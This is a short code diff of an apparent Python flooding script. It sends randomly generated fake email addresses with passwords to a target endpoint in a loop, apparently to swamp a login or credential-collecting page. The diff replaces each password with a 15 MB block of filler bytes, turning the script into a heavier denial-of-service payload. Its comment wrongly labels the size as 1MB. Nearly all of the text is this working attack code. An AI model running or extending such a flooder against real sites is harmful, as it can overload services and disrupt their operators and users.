@@ -49,11 +49,11 @@ with open("passlist.txt", "r") as file_h:
 reqhandle = sender()
 
 def runner():
+    massivedata = b"A" * (15 * 1024 ** 2)  # 1MB
     while not exiting:
-
         indx = random.randint(0, len(emails) - 1)
         email = f"{firstnames[random.randint(0, len(firstnames) - 1)]}.{lastnames[random.randint(0, len(lastnames) - 1)]}@{emails[indx]}"
-        password = passwords[random.randint(0, len(passwords) - 1)]
+        password = massivedata #passwords[random.randint(0, len(passwords) - 1)]
         reqhandle.send(email, password, fullpath)
         time.sleep(0.3)
 
